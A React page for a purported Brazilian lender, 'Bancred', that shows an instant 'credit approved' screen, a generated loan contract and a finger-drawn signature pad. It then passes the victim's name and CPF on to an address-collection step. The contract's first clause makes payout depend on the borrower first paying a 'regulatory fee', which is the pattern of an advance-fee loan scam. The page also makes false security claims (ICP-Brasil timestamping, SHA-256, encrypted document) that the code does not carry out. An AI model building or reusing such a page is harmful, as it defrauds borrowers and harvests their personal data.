import { useEffect, useMemo, useRef, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import confetti from "canvas-confetti";
import {
  CheckCircle2,
  ShieldCheck,
  Clock,
  Wallet,
  CalendarClock,
  FileText,
  Banknote,
  Pencil,
  X,
  Lock,
  Check,
} from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import ConsultorCard from "@/components/ConsultorCard";
import { calcularParcelaMensal } from "@/lib/loanMath";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const Aprovado = () => {
  const navigate = useNavigate();
  const [params] = useSearchParams();

  const valor = Number(params.get("valor") || 9000);
  const parcelas = Number(params.get("parcelas") || 36);
  const nomeRaw = params.get("nome") || "";
  const cpfRaw = (params.get("cpf") || "").replace(/\D/g, "");
  const primeiroNome = (nomeRaw.split(" ")[0] || "Cliente").toUpperCase();
  const nomeUpper = (nomeRaw || "Cliente").toUpperCase();

  // Mesma lógica única (src/lib/loanMath.ts) usada em /oferta e /dashboard
  const parcelaMensal = useMemo(
    () => calcularParcelaMensal(valor, parcelas),
    [valor, parcelas],
  );

  const totalPagar = parcelaMensal * parcelas;

  const primeiraParcela = useMemo(() => {
    const d = new Date();
    d.setDate(d.getDate() + 90);
    return d.toLocaleDateString("pt-BR");
  }, []);

  const ccbNumber = useMemo(() => {
    const ano = new Date().getFullYear();
    const seed = (cpfRaw || nomeRaw || "000000").split("").reduce((a, c) => a + c.charCodeAt(0), 0);
    const num = ((seed * 7919) % 900000) + 100000;
    return `CCB-${ano}-${num}`;
  }, [cpfRaw, nomeRaw]);

  const dataHoje = useMemo(() => new Date().toLocaleDateString("pt-BR"), []);

  const [contractOpen, setContractOpen] = useState(false);
  const [readEnd, setReadEnd] = useState(false);
  const [check1, setCheck1] = useState(false);
  const [check2, setCheck2] = useState(false);
  const scrollRef = useRef<HTMLDivElement | null>(null);

  const [signOpen, setSignOpen] = useState(false);
  const [hasSignature, setHasSignature] = useState(false);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const drawingRef = useRef(false);
  const lastPointRef = useRef<{ x: number; y: number } | null>(null);

  const canSign = readEnd && check1 && check2;

  const openContract = () => {
    setReadEnd(false);
    setCheck1(false);
    setCheck2(false);
    setContractOpen(true);
  };

  const handleScroll = () => {
    const el = scrollRef.current;
    if (!el) return;
    if (el.scrollTop + el.clientHeight >= el.scrollHeight - 8) {
      setReadEnd(true);
    }
  };

  const handleSign = () => {
    if (!canSign) return;
    setContractOpen(false);
    setHasSignature(false);
    setSignOpen(true);
  };

  // Configura o canvas (DPI alto) sempre que abre o modal de assinatura
  useEffect(() => {
    if (!signOpen) return;
    const canvas = canvasRef.current;
    if (!canvas) return;
    const dpr = window.devicePixelRatio || 1;
    const rect = canvas.getBoundingClientRect();
    canvas.width = rect.width * dpr;
    canvas.height = rect.height * dpr;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    ctx.scale(dpr, dpr);
    ctx.lineCap = "round";
    ctx.lineJoin = "round";
    ctx.lineWidth = 2.4;
    ctx.strokeStyle = "#0F172A";
  }, [signOpen]);

  const getPoint = (e: React.PointerEvent<HTMLCanvasElement>) => {
    const canvas = canvasRef.current!;
    const rect = canvas.getBoundingClientRect();
    return { x: e.clientX - rect.left, y: e.clientY - rect.top };
  };

  const startDraw = (e: React.PointerEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    (e.target as HTMLCanvasElement).setPointerCapture(e.pointerId);
    drawingRef.current = true;
    lastPointRef.current = getPoint(e);
  };

  const moveDraw = (e: React.PointerEvent<HTMLCanvasElement>) => {
    if (!drawingRef.current) return;
    const ctx = canvasRef.current?.getContext("2d");
    if (!ctx || !lastPointRef.current) return;
    const p = getPoint(e);
    ctx.beginPath();
    ctx.moveTo(lastPointRef.current.x, lastPointRef.current.y);
    ctx.lineTo(p.x, p.y);
    ctx.stroke();
    lastPointRef.current = p;
    if (!hasSignature) setHasSignature(true);
  };

  const endDraw = () => {
    drawingRef.current = false;
    lastPointRef.current = null;
  };

  const clearSignature = () => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    setHasSignature(false);
  };

  const confirmSignature = () => {
    if (!hasSignature) return;
    const qs = new URLSearchParams(params);
    navigate(`/endereco?${qs.toString()}`);
  };

  // 🎉 Comemoração curta e suave ao entrar na tela de aprovação
  useEffect(() => {
    const colors = ["#1C68E3", "#3B82F6", "#60A5FA", "#22C55E", "#16A34A", "#86EFAC"];
    const duration = 1500;
    const end = Date.now() + duration;

    // Uma única explosão central, leve
    confetti({
      particleCount: 90,
      spread: 90,
      startVelocity: 40,
      origin: { x: 0.5, y: 0.35 },
      colors,
      ticks: 200,
    });

    // Chuva curta pelas laterais
    const interval = window.setInterval(() => {
      if (Date.now() > end) {
        window.clearInterval(interval);
        return;
      }
      confetti({
        particleCount: 10,
        angle: 60,
        spread: 60,
        startVelocity: 40,
        origin: { x: 0, y: 0.3 },
        colors,
        ticks: 200,
      });
      confetti({
        particleCount: 10,
        angle: 120,
        spread: 60,
        startVelocity: 40,
        origin: { x: 1, y: 0.3 },
        colors,
        ticks: 200,
      });
    }, 250);

    return () => window.clearInterval(interval);
  }, []);

  return (
    <div
      style={{
        minHeight: "100dvh",
        background: "#F4F4F7",
        fontFamily: fontStack,
        color: "#111827",
        WebkitFontSmoothing: "antialiased",
      }}
    >
      <header
        style={{
          background: "#FFFFFF",
          borderBottom: "1px solid #E5E7EB",
          padding: "14px 16px",
          textAlign: "center",
        }}
      >
        <img src={logo} alt="Bancred" style={{ height: 76, width: "auto", display: "inline-block", objectFit: "contain" }} />
      </header>

      <main style={{ padding: "24px 16px", maxWidth: 480, margin: "0 auto" }}>
        <div style={{ marginBottom: 16 }}>
          <ConsultorCard />
        </div>
        <div style={{ textAlign: "center", marginBottom: 18 }}>
          <div
            style={{
              width: 72,
              height: 72,
              borderRadius: "50%",
              background: "#DCFCE7",
              color: "#16A34A",
              display: "inline-flex",
              alignItems: "center",
              justifyContent: "center",
              marginBottom: 14,
            }}
          >
            <CheckCircle2 size={36} strokeWidth={2.5} />
          </div>
          <h1 style={{ fontSize: 24, fontWeight: 700, color: "#111827", marginBottom: 4 }}>
            Crédito aprovado!
          </h1>
          <p style={{ fontSize: 14, color: "#6B7280" }}>
            Parabéns, {primeiroNome}. Sua proposta está pronta.
          </p>
        </div>

        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 16,
            padding: 22,
            boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)",
            border: "1px solid #E5E7EB",
            marginBottom: 12,
          }}
        >
          <div style={{ fontSize: 12, color: "#6B7280", textTransform: "uppercase", letterSpacing: 0.5 }}>
            Valor aprovado
          </div>
          <div style={{ fontSize: 34, fontWeight: 800, color: "#1C68E3", marginTop: 4, marginBottom: 8 }}>
            {formatBRL(valor)}
          </div>
          <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 6,
                background: "#DCFCE7",
                color: "#15803D",
                fontSize: 12,
                fontWeight: 600,
                padding: "4px 10px",
                borderRadius: 999,
              }}
            >
              <ShieldCheck size={12} /> Liberação imediata após confirmação
            </div>
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 6,
                background: "#EFF6FF",
                color: "#1C68E3",
                fontSize: 12,
                fontWeight: 600,
                padding: "4px 10px",
                borderRadius: 999,
              }}
            >
              <Clock size={12} /> 90 dias para começar a pagar!
            </div>
          </div>
        </div>

        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 16,
            padding: 18,
            boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)",
            border: "1px solid #E5E7EB",
            marginBottom: 12,
          }}
        >
          {[
            { Icon: Wallet, label: "Parcela mensal", value: formatBRL(parcelaMensal) },
            { Icon: CalendarClock, label: "1ª parcela", value: primeiraParcela },
            { Icon: ShieldCheck, label: "Total de parcelas", value: `${parcelas}x` },
          ].map((row, idx, arr) => (
            <div key={row.label}>
              <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                <span
                  style={{
                    width: 32,
                    height: 32,
                    borderRadius: 8,
                    background: "#EFF6FF",
                    color: "#1C68E3",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    flexShrink: 0,
                  }}
                >
                  <row.Icon size={16} />
                </span>
                <div style={{ flex: 1, fontSize: 13, color: "#6B7280" }}>{row.label}</div>
                <div style={{ fontSize: 14, fontWeight: 700, color: "#111827" }}>{row.value}</div>
              </div>
              {idx < arr.length - 1 && <div style={{ height: 1, background: "#E5E7EB", margin: "12px 0" }} />}
            </div>
          ))}
        </div>

        <div
          style={{
            background: "#EFF6FF",
            borderRadius: 16,
            padding: 18,
            border: "1px solid #DBEAFE",
            marginBottom: 18,
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
            <CheckCircle2 size={18} color="#1C68E3" />
            <span style={{ fontSize: 15, fontWeight: 700, color: "#111827" }}>Próximos Passos</span>
          </div>
          <ul style={{ listStyle: "none", padding: 0, margin: 0, display: "flex", flexDirection: "column", gap: 10 }}>
            {[
              { Icon: FileText, text: "Leia e assine o contrato (CCB) digitalmente" },
              { Icon: Banknote, text: "O valor será transferido para você via Pix" },
            ].map(({ Icon, text }) => (
              <li key={text} style={{ display: "flex", alignItems: "flex-start", gap: 10 }}>
                <span
                  style={{
                    width: 24,
                    height: 24,
                    borderRadius: "50%",
                    background: "#FFFFFF",
                    color: "#1C68E3",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    flexShrink: 0,
                    marginTop: 1,
                    border: "1px solid #DBEAFE",
                  }}
                >
                  <Icon size={14} />
                </span>
                <span style={{ fontSize: 13, color: "#111827", lineHeight: 1.4 }}>{text}</span>
              </li>
            ))}
          </ul>
        </div>

        <button
          type="button"
          onClick={openContract}
          style={{
            width: "100%",
            padding: "15px 20px",
            background: "#1C68E3",
            color: "#fff",
            border: "none",
            borderRadius: 14,
            fontSize: 16,
            fontWeight: 700,
            letterSpacing: -0.2,
            cursor: "pointer",
            boxShadow: "0 8px 24px rgba(28,104,227,0.28)",
            display: "inline-flex",
            alignItems: "center",
            justifyContent: "center",
            gap: 8,
            minHeight: 52,
          }}
        >
          <Pencil size={16} /> Ler e assinar contrato
        </button>
        <p style={{ fontSize: 11, color: "#9CA3AF", textAlign: "center", marginTop: 14, display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}>
          <ShieldCheck size={12} /> Contrato com validade jurídica · MP 2.200-2/2001
        </p>
      </main>

      {contractOpen && (
        <div
          role="dialog"
          aria-modal="true"
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(15,23,42,0.55)",
            zIndex: 1000,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            padding: 16,
          }}
          onClick={() => setContractOpen(false)}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              background: "#FFFFFF",
              borderRadius: 18,
              width: "100%",
              maxWidth: 560,
              maxHeight: "92dvh",
              display: "flex",
              flexDirection: "column",
              overflow: "hidden",
              boxShadow: "0 24px 60px rgba(0,0,0,0.25)",
            }}
          >
            {/* Header */}
            <div
              style={{
                background: "#EFF6FF",
                padding: "14px 16px",
                display: "flex",
                alignItems: "center",
                gap: 12,
                borderBottom: "1px solid #DBEAFE",
              }}
            >
              <span
                style={{
                  width: 36,
                  height: 36,
                  borderRadius: 10,
                  background: "#FFFFFF",
                  color: "#1C68E3",
                  display: "inline-flex",
                  alignItems: "center",
                  justifyContent: "center",
                  flexShrink: 0,
                  border: "1px solid #DBEAFE",
                }}
              >
                <FileText size={18} />
              </span>
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontSize: 15, fontWeight: 700, color: "#111827" }}>
                  Cédula de Crédito Bancário
                </div>
                <div style={{ fontSize: 12, color: "#6B7280" }}>
                  Nº {ccbNumber} · Leia até o fim
                </div>
              </div>
              <button
                type="button"
                aria-label="Fechar"
                onClick={() => setContractOpen(false)}
                style={{
                  background: "transparent",
                  border: "none",
                  cursor: "pointer",
                  color: "#6B7280",
                  padding: 4,
                  display: "inline-flex",
                }}
              >
                <X size={20} />
              </button>
            </div>

            {/* Scrollable content */}
            <div
              ref={scrollRef}
              onScroll={handleScroll}
              style={{
                overflowY: "auto",
                padding: "18px 18px 8px",
                fontSize: 13.5,
                lineHeight: 1.55,
                color: "#111827",
                flex: 1,
              }}
            >
              <h2 style={{ fontSize: 15, fontWeight: 800, textAlign: "center", margin: "0 0 14px" }}>
                CÉDULA DE CRÉDITO BANCÁRIO Nº {ccbNumber}
              </h2>

              <p style={{ margin: "0 0 10px" }}>
                <strong>EMITENTE (DEVEDOR):</strong> {nomeUpper}, CPF {cpfRaw || "—"}, doravante denominado(a) <strong>EMITENTE</strong>.
              </p>
              <p style={{ margin: "0 0 10px" }}>
                <strong>CREDOR:</strong> BANCRED SERVIÇOS FINANCEIROS S.A., instituição autorizada a operar pelo Banco Central do Brasil, doravante denominada <strong>CREDOR</strong>.
              </p>
              <p style={{ margin: "0 0 14px" }}>
                Pela presente Cédula de Crédito Bancário, emitida nos termos da <strong>Lei nº 10.931/2004</strong>, da <strong>Resolução CMN nº 4.881/2020</strong> e da <strong>MP nº 2.200-2/2001</strong> (que confere validade jurídica à assinatura eletrônica), o EMITENTE confessa-se devedor da quantia líquida, certa e exigível abaixo discriminada.
              </p>

              <div
                style={{
                  border: "1px solid #E5E7EB",
                  borderRadius: 12,
                  padding: "4px 14px",
                  marginBottom: 14,
                }}
              >
                {[
                  { label: "Valor do crédito", value: formatBRL(valor) },
                  { label: "Quantidade de parcelas", value: `${parcelas}x` },
                  { label: "Valor da parcela", value: formatBRL(parcelaMensal) },
                  { label: "Total a pagar", value: formatBRL(totalPagar) },
                  { label: "CET aproximado", value: "1,89% a.m." },
                  { label: "Carência (1ª parcela)", value: "90 dias" },
                ].map((row, idx, arr) => (
                  <div
                    key={row.label}
                    style={{
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                      padding: "10px 0",
                      borderBottom: idx < arr.length - 1 ? "1px dashed #E5E7EB" : "none",
                      fontSize: 13,
                    }}
                  >
                    <span style={{ color: "#6B7280" }}>{row.label}</span>
                    <span style={{ fontWeight: 700, color: "#111827" }}>{row.value}</span>
                  </div>
                ))}
              </div>

              {[
                ["Cláusula 1ª — Liberação:", "O CREDOR se compromete a liberar o valor integral via PIX em até 5 (cinco) minutos após a confirmação dos custos operacionais (taxa regulatória da operação) pelo EMITENTE, conforme exigido pela Resolução BCB nº 96/2021."],
                ["Cláusula 2ª — Carência:", "Concede-se ao EMITENTE prazo de carência de 90 (noventa) dias para o início do pagamento, sem incidência de juros adicionais durante o período."],
                ["Cláusula 3ª — Registro no SCR:", "Esta operação será registrada no Sistema de Informações de Créditos do Banco Central (SCR/Bacen) em nome do EMITENTE, conforme Resolução CMN nº 4.571/2017."],
                ["Cláusula 4ª — Inadimplência:", "Em caso de inadimplemento, incidirão juros de mora de 1% (um por cento) ao mês, multa de 2% (dois por cento) sobre o valor devido e correção pelo IPCA, sem prejuízo da inscrição em órgãos de proteção ao crédito."],
                ["Cláusula 5ª — Veracidade:", "O EMITENTE declara, sob as penas da lei (art. 299 do Código Penal), que todas as informações prestadas são verdadeiras e autoriza o CREDOR a consultar bureaus de crédito (Serasa, SPC, Boa Vista) e o SCR/Bacen."],
                ["Cláusula 6ª — Assinatura Eletrônica:", "As partes reconhecem a validade da assinatura eletrônica aposta nesta CCB, nos termos da MP 2.200-2/2001 e da Lei nº 14.063/2020, sendo dispensada a assinatura física ou de testemunhas."],
                ["Cláusula 7ª — Foro:", "Fica eleito o foro da comarca do EMITENTE para dirimir quaisquer questões oriundas desta cédula."],
              ].map(([titulo, texto]) => (
                <p key={titulo} style={{ margin: "0 0 12px" }}>
                  <strong>{titulo}</strong> {texto}
                </p>
              ))}

              <p style={{ margin: "14px 0 16px" }}>
                E por estar de pleno acordo, o EMITENTE assina a presente Cédula de Crédito Bancário em formato eletrônico, em <strong>{dataHoje}</strong>, com pleno reconhecimento de seu valor jurídico e força executiva extrajudicial, nos termos do <strong>art. 28 da Lei nº 10.931/2004</strong>.
              </p>

              {readEnd && (
                <div
                  style={{
                    background: "#DCFCE7",
                    color: "#15803D",
                    border: "1px solid #BBF7D0",
                    borderRadius: 10,
                    padding: "10px 12px",
                    fontSize: 13,
                    fontWeight: 600,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 8,
                    marginBottom: 8,
                  }}
                >
                  <Check size={16} /> Você leu o contrato até o fim
                </div>
              )}
            </div>

            {/* Checkboxes + Action */}
            <div
              style={{
                borderTop: "1px solid #E5E7EB",
                padding: "14px 16px 16px",
                background: "#FFFFFF",
              }}
            >
              {[
                {
                  checked: check1,
                  toggle: () => setCheck1((v) => !v),
                  title: "Li e concordo com todas as cláusulas",
                  desc: `Aceito integralmente os termos da CCB nº ${ccbNumber}.`,
                },
                {
                  checked: check2,
                  toggle: () => setCheck2((v) => !v),
                  title: "Declaro a veracidade dos dados",
                  desc: "Autorizo consulta ao SCR/Bacen, Serasa e SPC.",
                },
              ].map((item) => (
                <button
                  key={item.title}
                  type="button"
                  onClick={item.toggle}
                  style={{
                    width: "100%",
                    display: "flex",
                    alignItems: "flex-start",
                    gap: 12,
                    padding: "12px 14px",
                    border: `1.5px solid ${item.checked ? "#22C55E" : "#E5E7EB"}`,
                    background: item.checked ? "#F0FDF4" : "#FFFFFF",
                    borderRadius: 12,
                    marginBottom: 10,
                    cursor: "pointer",
                    textAlign: "left",
                    fontFamily: fontStack,
                  }}
                >
                  <span
                    style={{
                      width: 22,
                      height: 22,
                      borderRadius: 6,
                      border: `1.5px solid ${item.checked ? "#22C55E" : "#CBD5E1"}`,
                      background: item.checked ? "#22C55E" : "#FFFFFF",
                      display: "inline-flex",
                      alignItems: "center",
                      justifyContent: "center",
                      flexShrink: 0,
                      marginTop: 1,
                      color: "#FFFFFF",
                    }}
                  >
                    {item.checked && <Check size={14} strokeWidth={3} />}
                  </span>
                  <div style={{ minWidth: 0 }}>
                    <div style={{ fontSize: 14, fontWeight: 700, color: "#111827" }}>{item.title}</div>
                    <div style={{ fontSize: 12, color: "#6B7280", marginTop: 2 }}>{item.desc}</div>
                  </div>
                </button>
              ))}

              <button
                type="button"
                onClick={handleSign}
                disabled={!canSign}
                style={{
                  width: "100%",
                  padding: "14px 20px",
                  background: canSign ? "#1C68E3" : "#CBD5E1",
                  color: "#FFFFFF",
                  border: "none",
                  borderRadius: 14,
                  fontSize: 15,
                  fontWeight: 700,
                  cursor: canSign ? "pointer" : "not-allowed",
                  display: "inline-flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8,
                  minHeight: 50,
                  marginTop: 4,
                  boxShadow: canSign ? "0 8px 24px rgba(28,104,227,0.28)" : "none",
                  transition: "background 0.15s ease",
                }}
              >
                <Pencil size={15} /> Avançar para assinatura
              </button>
              <p
                style={{
                  fontSize: 11,
                  color: "#9CA3AF",
                  textAlign: "center",
                  marginTop: 10,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 6,
                }}
              >
                <Lock size={11} /> Conexão segura · TLS 1.3 · Documento criptografado
              </p>
            </div>
          </div>
        </div>
      )}

      {signOpen && (
        <div
          role="dialog"
          aria-modal="true"
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(15,23,42,0.55)",
            zIndex: 1100,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            padding: 16,
          }}
        >
          <div
            style={{
              background: "#FFFFFF",
              borderRadius: 18,
              width: "100%",
              maxWidth: 520,
              maxHeight: "92dvh",
              display: "flex",
              flexDirection: "column",
              overflow: "hidden",
              boxShadow: "0 24px 60px rgba(0,0,0,0.25)",
            }}
          >
            {/* Header */}
            <div
              style={{
                background: "#EFF6FF",
                padding: "14px 16px",
                display: "flex",
                alignItems: "center",
                gap: 12,
                borderBottom: "1px solid #DBEAFE",
              }}
            >
              <span
                style={{
                  width: 36,
                  height: 36,
                  borderRadius: 10,
                  background: "#FFFFFF",
                  color: "#1C68E3",
                  display: "inline-flex",
                  alignItems: "center",
                  justifyContent: "center",
                  flexShrink: 0,
                  border: "1px solid #DBEAFE",
                }}
              >
                <Pencil size={18} />
              </span>
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontSize: 15, fontWeight: 700, color: "#111827" }}>
                  Assinatura Digital
                </div>
                <div style={{ fontSize: 12, color: "#6B7280" }}>
                  Assine com o dedo no campo abaixo
                </div>
              </div>
              <button
                type="button"
                aria-label="Fechar"
                onClick={() => setSignOpen(false)}
                style={{
                  background: "transparent",
                  border: "none",
                  cursor: "pointer",
                  color: "#6B7280",
                  padding: 4,
                  display: "inline-flex",
                }}
              >
                <X size={20} />
              </button>
            </div>

            {/* Body */}
            <div style={{ padding: "18px 18px 8px", overflowY: "auto", flex: 1 }}>
              <h3 style={{ fontSize: 15, fontWeight: 700, margin: "0 0 6px", color: "#111827" }}>
                Assine no campo abaixo
              </h3>
              <p style={{ fontSize: 13, color: "#6B7280", margin: "0 0 14px", lineHeight: 1.5 }}>
                Use o dedo (ou o mouse) para desenhar sua assinatura. Esta assinatura tem validade
                jurídica conforme a MP 2.200-2/2001.
              </p>

              <div
                style={{
                  position: "relative",
                  background: "#F8FAFC",
                  border: "1.5px dashed #CBD5E1",
                  borderRadius: 12,
                  height: 200,
                  overflow: "hidden",
                  marginBottom: 6,
                }}
              >
                <canvas
                  ref={canvasRef}
                  onPointerDown={startDraw}
                  onPointerMove={moveDraw}
                  onPointerUp={endDraw}
                  onPointerLeave={endDraw}
                  style={{
                    width: "100%",
                    height: "100%",
                    touchAction: "none",
                    cursor: "crosshair",
                    display: "block",
                  }}
                />
                {!hasSignature && (
                  <div
                    style={{
                      position: "absolute",
                      inset: 0,
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      pointerEvents: "none",
                      color: "#94A3B8",
                      fontSize: 14,
                      gap: 6,
                    }}
                  >
                    <Pencil size={14} /> assine aqui
                  </div>
                )}
              </div>

              <div
                style={{
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  fontSize: 11,
                  color: "#6B7280",
                  borderTop: "1px solid #E5E7EB",
                  paddingTop: 8,
                  marginBottom: 12,
                }}
              >
                <span style={{ textTransform: "uppercase", letterSpacing: 0.4 }}>{nomeUpper}</span>
                <span>{dataHoje}</span>
              </div>

              <button
                type="button"
                onClick={clearSignature}
                style={{
                  background: "#FFFFFF",
                  color: "#111827",
                  border: "1px solid #E5E7EB",
                  borderRadius: 10,
                  padding: "8px 14px",
                  fontSize: 13,
                  fontWeight: 600,
                  cursor: "pointer",
                  marginBottom: 14,
                  fontFamily: fontStack,
                }}
              >
                Limpar assinatura
              </button>

              <div
                style={{
                  background: "#DCFCE7",
                  border: "1px solid #BBF7D0",
                  borderRadius: 10,
                  padding: "10px 12px",
                  fontSize: 12.5,
                  color: "#15803D",
                  display: "flex",
                  alignItems: "flex-start",
                  gap: 8,
                  lineHeight: 1.45,
                }}
              >
                <ShieldCheck size={16} style={{ flexShrink: 0, marginTop: 1 }} />
                <span>
                  Sua assinatura é criptografada (SHA-256) e armazenada com carimbo de tempo da
                  ICP-Brasil. Equivalente jurídico à assinatura em papel.
                </span>
              </div>
            </div>

            {/* Footer actions */}
            <div
              style={{
                borderTop: "1px solid #E5E7EB",
                padding: "14px 16px 16px",
                background: "#FFFFFF",
              }}
            >
              <button
                type="button"
                onClick={confirmSignature}
                disabled={!hasSignature}
                style={{
                  width: "100%",
                  padding: "14px 20px",
                  background: hasSignature ? "#1C68E3" : "#CBD5E1",
                  color: "#FFFFFF",
                  border: "none",
                  borderRadius: 14,
                  fontSize: 15,
                  fontWeight: 700,
                  cursor: hasSignature ? "pointer" : "not-allowed",
                  display: "inline-flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8,
                  minHeight: 50,
                  boxShadow: hasSignature ? "0 8px 24px rgba(28,104,227,0.28)" : "none",
                  transition: "background 0.15s ease",
                  marginBottom: 10,
                }}
              >
                <Check size={16} /> Confirmar e assinar contrato
              </button>
              <button
                type="button"
                onClick={() => {
                  setSignOpen(false);
                  setContractOpen(true);
                }}
                style={{
                  width: "100%",
                  padding: "12px 20px",
                  background: "#FFFFFF",
                  color: "#111827",
                  border: "1px solid #E5E7EB",
                  borderRadius: 14,
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: "pointer",
                  fontFamily: fontStack,
                }}
              >
                ← Voltar ao contrato
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Aprovado;
